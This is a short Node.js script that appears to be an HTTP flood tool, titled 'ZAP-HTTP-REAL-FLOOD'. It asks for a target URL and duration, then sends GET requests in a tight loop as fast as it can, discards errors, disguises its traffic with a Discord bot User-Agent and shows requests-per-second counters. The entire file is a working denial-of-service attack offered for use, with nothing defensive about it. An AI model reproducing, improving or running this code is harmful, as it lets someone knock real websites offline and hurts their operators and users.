const http = require('http');
const https = require('https');
const { URL } = require('url');
const readline = require('readline');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

const prompt = (q) => new Promise(res => rl.question(q, res));
const clear = () => process.stdout.write('\x1Bc');

let total = 0;
let last = 0;
let maxRPS = 0;

async function start() {
    clear();
    console.log("jrl@zap.live >");

    const rawTarget = await prompt("[¿T] > ");
    const duration = parseInt(await prompt("[¿DU!] > ")) || 60;

    const url = new URL(rawTarget.startsWith('http') ? rawTarget : `http://${rawTarget}`);
    const end = Date.now() + duration * 1000;
    const client = url.protocol === 'https:' ? https : http;

    clear();

    setInterval(() => {
        const rps = total - last;
        maxRPS = Math.max(maxRPS, rps);
        last = total;

        clear();
        console.log("ZAP-HTTP-REAL-FLOOD");
        console.log(`Requests:     ${total}`);
        console.log(`Reqs/sec:     ${rps}`);
        console.log(`Max Req/sec:  ${maxRPS}`);
    }, Math.floor(Math.random() * 2000) + 3000);

    function blast() {
        if (Date.now() > end) return stop();

        const options = {
            hostname: url.hostname,
            port: url.port || (url.protocol === 'https:' ? 443 : 80),
            path: url.pathname || "/",
            method: "GET",
            headers: {
                'User-Agent': 'Discordbot/2.0 (+https://discordapp.com)',
                'Accept': '*/*',
                'Connection': 'close',
            }
        };

        const req = client.request(options);
        req.on('error', () => {}); // swallow fails
        req.end();

        total++;
        setImmediate(blast);
    }

    blast();
}

function stop() {
    clear();
    console.log("ZAP-HTTP-REAL-FLOOD DONE");
    console.log(`Requests:     ${total}`);
    console.log(`Max Req/sec:  ${maxRPS}`);
    process.exit(0);
}

start();
